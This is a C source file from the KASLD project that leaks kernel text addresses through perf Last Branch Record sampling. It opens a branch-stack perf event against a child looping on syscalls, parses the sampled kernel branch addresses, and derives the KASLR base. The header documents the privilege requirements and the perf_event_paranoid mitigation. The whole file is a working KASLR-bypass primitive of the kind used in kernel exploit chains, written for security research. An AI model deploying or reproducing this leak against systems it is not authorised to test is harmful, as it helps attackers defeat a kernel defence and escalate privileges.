// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Capture kernel branch addresses via perf Last Branch Record sampling.
//
// The CPU's LBR (Last Branch Record) hardware records the most recent N
// branches the CPU executed. Modern Intel CPUs (Nehalem+) provide 16 entries;
// Sandy Bridge+ provides 32; AMD Zen+ provides similar. Each entry holds the
// `from` and `to` virtual address of one branch.
//
// perf_event_open() exposes LBR via:
//   sample_type        |= PERF_SAMPLE_BRANCH_STACK
//   branch_sample_type  = PERF_SAMPLE_BRANCH_KERNEL | PERF_SAMPLE_BRANCH_ANY
//   exclude_user        = 1
// On every PERF_RECORD_SAMPLE the kernel emits the LBR snapshot at the moment
// the sample fired, yielding 16–32 kernel branch addresses per sample. With
// sample_period = 10000 cycles and a child doing a busy syscall loop, this
// densely samples the syscall fast path — entry_SYSCALL_64, do_syscall_64,
// the syscall handler, and any helpers it touches.
//
// Gating: PERF_SAMPLE_BRANCH_KERNEL sets PERF_SAMPLE_BRANCH_PERM_PLM, which
// trips perf_allow_kernel() in perf_event_open() — paranoid<=1 OR CAP_PERFMON.
// The attr.exclude_user=1 path also goes through perf_allow_kernel for the
// same reason (it's about who is allowed to sample kernel state).
//
// Requires:
// - kernel.perf_event_paranoid <= 1 OR CAP_PERFMON
// - x86_64 with LBR-capable CPU (Intel Nehalem+, AMD Zen+)
//
// Leak primitive:
//   Data leaked:      kernel branch addresses (from / to per LBR entry)
//   Kernel subsystem: kernel/events + arch/x86/events — Last Branch Record
//   Data structure:   perf_branch_entry { from, to, flags }
//   Address type:     virtual (kernel text)
//   Method:           exact (CPU hardware branch trace)
//   Access check:     perf_allow_kernel() — paranoid<=1 or CAP_PERFMON
//   Source:
//     https://elixir.bootlin.com/linux/v6.12/source/kernel/events/core.c
//     https://elixir.bootlin.com/linux/v6.12/source/arch/x86/events/intel/lbr.c
//
// Mitigations:
//   kernel.perf_event_paranoid >= 2 (default on most distros) blocks
//   unprivileged LBR. Bypass requires CAP_PERFMON (v5.8+) or CAP_SYS_ADMIN.
//
// x86_64 only — LBR is x86-specific hardware. ARM has BRBE (Branch Record
// Buffer Extension, v8.9+) with a different perf interface; not covered here.
// ---
// <bcoles@gmail.com>

#if !defined(__x86_64__)
#error "Architecture is not supported"
#endif

#define _GNU_SOURCE
#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include <errno.h>
#include <linux/perf_event.h>
#include <poll.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

KASLD_EXPLAIN(
    "Opens a perf event with PERF_SAMPLE_BRANCH_STACK and "
    "branch_sample_type=KERNEL|ANY against a child process doing a busy "
    "syscall loop. Each PERF_RECORD_SAMPLE delivers the CPU's Last Branch "
    "Record snapshot (16–32 kernel branch addresses per sample). Gated by "
    "kernel.perf_event_paranoid <= 1 or CAP_PERFMON.");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "addr:virtual\n"
           "sysctl:perf_event_paranoid>=2\n"
           "bypass:CAP_PERFMON\n"
           "bypass:CAP_SYS_ADMIN\n");

/* Multi-page data ring: must be power-of-2 pages, plus the metadata page.
 * LBR samples are ~408 bytes each (header + IP + bnr + 16 × 24); a 16-page
 * ring (~64 KB) holds ~150 samples before wrap. */
#define DATA_PAGES 16

/* How many samples to collect before stopping. Each sample yields up to
 * LBR-depth × 2 kernel addresses (from + to). 50 samples × 32 entries × 2 =
 * up to 3200 raw addresses; after dedup typically ~50–100 unique. */
#define TARGET_SAMPLES 50

/* Maximum LBR depth on any current CPU. AMD Zen 4 has 32; future may grow. */
#define MAX_LBR_DEPTH 128

/* Maximum on-stack record buffer. Header + IP + bnr + LBR-depth × 24. */
#define MAX_RECORD (32 + (size_t)MAX_LBR_DEPTH * 24)

static long perf_event_open_(struct perf_event_attr *attr, pid_t pid, int cpu,
                             int group_fd, unsigned long flags) {
  return syscall(SYS_perf_event_open, attr, pid, cpu, group_fd, flags);
}

/* Copy `n` bytes out of the ring at byte offset `off`, handling wrap. */
static void ring_copy(const char *ring, size_t ring_size, uint64_t off,
                      void *dst, size_t n) {
  size_t off_in = (size_t)(off % ring_size);
  size_t first = ring_size - off_in;
  if (first >= n) {
    memcpy(dst, ring + off_in, n);
  } else {
    memcpy(dst, ring + off_in, first);
    memcpy((char *)dst + first, ring, n - first);
  }
}

/* perf_branch_entry: 24 bytes, { __u64 from; __u64 to; __u64 flags_bitfield }.
 * We only need from/to as kernel addresses. */
struct __attribute__((packed)) lbr_entry {
  uint64_t from;
  uint64_t to;
  uint64_t flags;
};

static int is_kernel_va(unsigned long a) {
  return a >= (unsigned long)KERNEL_VIRT_TEXT_MIN &&
         a <= (unsigned long)KERNEL_VIRT_TEXT_MAX;
}

int main(int argc, char *argv[]) {
  kasld_cli(argc, argv);
  int verbose = kasld_is_verbose();

  long page_size = sysconf(_SC_PAGESIZE);
  if (page_size <= 0)
    return KASLD_EXIT_UNAVAILABLE;
  size_t ring_size = (size_t)page_size * DATA_PAGES;
  size_t map_size = (size_t)page_size + ring_size;

  kasld_info("trying perf LBR sampling on a busy-syscall child ...");

  pid_t child = fork();
  if (child == -1) {
    perror("[-] fork");
    return KASLD_EXIT_UNAVAILABLE;
  }
  if (child == 0) {
    /* Busy syscall loop — same shape as perf_event_open.c, gives the kernel
     * something to branch through on every sample. */
    struct utsname self;
    while (1)
      kasld_uname(&self);
    _exit(0);
  }

  struct perf_event_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.type = PERF_TYPE_HARDWARE;
  attr.config = PERF_COUNT_HW_CPU_CYCLES;
  attr.size = sizeof(attr);
  attr.sample_period = 10000;
  attr.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_BRANCH_STACK;
  attr.branch_sample_type = PERF_SAMPLE_BRANCH_KERNEL | PERF_SAMPLE_BRANCH_ANY;
  attr.exclude_user = 1;
  attr.exclude_hv = 1;
  attr.disabled = 1;
  attr.wakeup_events = 1;

  long fd = perf_event_open_(&attr, child, -1, -1, 0);
  if (fd < 0) {
    int e = errno;
    kill(child, SIGKILL);
    waitpid(child, NULL, 0);
    if (e == EACCES || e == EPERM) {
      fprintf(stderr,
              "[-] perf_event_open EACCES — needs perf_event_paranoid<=1 or "
              "CAP_PERFMON\n");
      return KASLD_EXIT_NOPERM;
    }
    if (e == ENOENT || e == EOPNOTSUPP) {
      kasld_err("LBR not available on this CPU");
      return KASLD_EXIT_UNAVAILABLE;
    }
    errno = e;
    perror("[-] perf_event_open");
    return KASLD_EXIT_UNAVAILABLE;
  }

  void *base = mmap(NULL, map_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (base == MAP_FAILED) {
    perror("[-] mmap");
    close((int)fd);
    kill(child, SIGKILL);
    waitpid(child, NULL, 0);
    return KASLD_EXIT_UNAVAILABLE;
  }

  if (ioctl((int)fd, PERF_EVENT_IOC_ENABLE, 0) < 0) {
    perror("[-] PERF_EVENT_IOC_ENABLE");
    munmap(base, map_size);
    close((int)fd);
    kill(child, SIGKILL);
    waitpid(child, NULL, 0);
    return KASLD_EXIT_UNAVAILABLE;
  }

  struct perf_event_mmap_page *meta = base;
  const char *ring = (const char *)base + page_size;

  int n_samples = 0;
  unsigned long n_kaddrs = 0;
  unsigned long min_addr = ~0UL;

  /* Track the minimum kernel address. The full address stream is printed
   * only in verbose mode. */
#define CONSIDER(a)                                                            \
  do {                                                                         \
    unsigned long _a = (unsigned long)(a);                                     \
    if (is_kernel_va(_a)) {                                                    \
      n_kaddrs++;                                                              \
      if (_a < min_addr)                                                       \
        min_addr = _a;                                                         \
      if (verbose)                                                             \
        kasld_debug("0x%lx", _a);                                              \
    }                                                                          \
  } while (0)

  struct pollfd pfd = {.fd = (int)fd, .events = POLLIN};
  while (n_samples < TARGET_SAMPLES) {
    if (poll(&pfd, 1, 1000) <= 0)
      break;

    /* Volatile read + explicit ACQUIRE fence rather than __atomic_load_n on
     * u64: 32-bit musl lacks the __atomic_load_8 libcall the latter would
     * compile to. (LBR is x86_64-only at compile time, so the 32-bit path
     * isn't exercised — kept consistent with the sibling perf components
     * for portability.) */
    uint64_t head = *(volatile __u64 *)&meta->data_head;
    __atomic_thread_fence(__ATOMIC_ACQUIRE);
    uint64_t tail = meta->data_tail;

    while (tail < head) {
      struct perf_event_header header;
      if (head - tail < sizeof(header))
        break;
      ring_copy(ring, ring_size, tail, &header, sizeof(header));
      if (header.size < sizeof(header) || header.size > MAX_RECORD)
        break;
      if (head - tail < header.size)
        break;

      if (header.type == PERF_RECORD_SAMPLE) {
        char buf[MAX_RECORD];
        ring_copy(ring, ring_size, tail, buf, header.size);

        size_t off = sizeof(header);
        /* PERF_SAMPLE_IP — 8 bytes. */
        if (off + 8 > header.size)
          goto skip;
        uint64_t ip;
        memcpy(&ip, buf + off, 8);
        off += 8;
        CONSIDER(ip);

        /* PERF_SAMPLE_BRANCH_STACK — { u64 nr, struct perf_branch_entry[] }. */
        if (off + 8 > header.size)
          goto skip;
        uint64_t bnr;
        memcpy(&bnr, buf + off, 8);
        off += 8;
        if (bnr > MAX_LBR_DEPTH)
          goto skip;
        for (uint64_t i = 0; i < bnr; i++) {
          if (off + sizeof(struct lbr_entry) > header.size)
            break;
          struct lbr_entry e;
          memcpy(&e, buf + off, sizeof(e));
          off += sizeof(e);
          CONSIDER(e.from);
          CONSIDER(e.to);
        }

        n_samples++;
      }
    skip:
      tail += header.size;
    }

    __atomic_thread_fence(__ATOMIC_RELEASE);
    *(volatile __u64 *)&meta->data_tail = tail;
  }

#undef CONSIDER

  ioctl((int)fd, PERF_EVENT_IOC_DISABLE, 0);
  munmap(base, map_size);
  close((int)fd);
  kill(child, SIGKILL);
  waitpid(child, NULL, 0);

  if (n_kaddrs == 0) {
    kasld_err("no kernel branch addresses captured");
    return KASLD_EXIT_UNAVAILABLE;
  }

  /* The captured branch address sits at image_base + offset (offset >= 0), a
   * sound interior witness (image_base <= min_addr). Tighten it to the sound
   * aligned base estimate via the shared helper, which preserves the base's
   * sub-alignment offset (a plain `& -KASLR_VIRT_ALIGN` would drop below the
   * base on the sub-offset arches; LBR is x86-only today, where the sub-offset
   * is 0, but the helper keeps this correct by construction). */
  unsigned long emit_addr = kasld_floor_text_base(min_addr);
  kasld_found("%lu kernel address(es) considered across %d sample(s)", n_kaddrs,
              n_samples);
  kasld_info("    lowest: 0x%lx  emit (aligned): 0x%lx", min_addr, emit_addr);

  kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_TEXT, emit_addr, NULL,
                      CONF_PARSED);
  return 0;
}
